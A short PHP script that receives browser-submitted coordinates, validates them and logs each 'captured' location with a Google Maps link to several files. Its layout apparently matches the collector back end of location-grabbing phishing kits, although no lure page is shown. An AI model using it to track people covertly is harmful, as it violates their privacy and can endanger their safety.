<?php

declare(strict_types=1);

header('Content-Type: application/json');

function respond(string $status, string $code, string $message, int $httpCode): void
{
    http_response_code($httpCode);
    echo json_encode([
        'status' => $status,
        'code' => $code,
        'message' => $message,
    ]);
    exit;
}

if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
    respond('error', 'method_not_allowed', 'Only POST is allowed', 405);
}

$latRaw = $_POST['lat'] ?? null;
$lonRaw = $_POST['lon'] ?? null;
$accRaw = $_POST['acc'] ?? null;

if ($latRaw === null || $lonRaw === null) {
    respond('error', 'missing_fields', 'Location data missing or incomplete', 400);
}

$latitude = filter_var($latRaw, FILTER_VALIDATE_FLOAT);
$longitude = filter_var($lonRaw, FILTER_VALIDATE_FLOAT);
$accuracy = $accRaw !== null ? filter_var($accRaw, FILTER_VALIDATE_FLOAT) : false;

if ($latitude === false || $longitude === false) {
    respond('error', 'invalid_coordinates', 'Latitude/Longitude must be numeric', 422);
}
if ($latitude < -90 || $latitude > 90 || $longitude < -180 || $longitude > 180) {
    respond('error', 'out_of_range', 'Latitude/Longitude out of range', 422);
}
if ($accuracy !== false && ($accuracy < 0 || $accuracy > 100000)) {
    respond('error', 'invalid_accuracy', 'Accuracy value is not valid', 422);
}

$date = gmdate('Ymd_His');
$accuracyText = $accuracy === false ? 'Unknown' : (string) $accuracy;
$data = "Latitude: {$latitude}\r\n"
    . "Longitude: {$longitude}\r\n"
    . "Accuracy: {$accuracyText} meters\r\n"
    . "Google Maps: https://www.google.com/maps/place/{$latitude},{$longitude}\r\n"
    . "Date: {$date}\r\n";

$locationFile = "location_{$date}.txt";
file_put_contents('LocationLog.log', "Location captured\n", FILE_APPEND | LOCK_EX);

if (file_put_contents($locationFile, $data, LOCK_EX) === false) {
    respond('error', 'write_failed', 'Could not save location data', 500);
}

if (file_put_contents('current_location.txt', $data, LOCK_EX) === false) {
    respond('error', 'write_failed', 'Could not save location snapshot', 500);
}

$masterFile = 'saved.locations.txt';
if (!file_exists($masterFile)) {
    touch($masterFile);
    chmod($masterFile, 0640);
}

$masterRecord = "\n=== New Location Captured ===\n{$data}\n";
if (file_put_contents($masterFile, $masterRecord, FILE_APPEND | LOCK_EX) === false) {
    respond('error', 'write_failed', 'Could not save location history', 500);
}

if (!is_dir('saved_locations') && !mkdir('saved_locations', 0750, true) && !is_dir('saved_locations')) {
    respond('error', 'mkdir_failed', 'Could not create saved_locations directory', 500);
}

if (!copy($locationFile, 'saved_locations/' . $locationFile)) {
    respond('error', 'copy_failed', 'Could not copy location file', 500);
}

respond('success', 'ok', 'Location data received', 200);
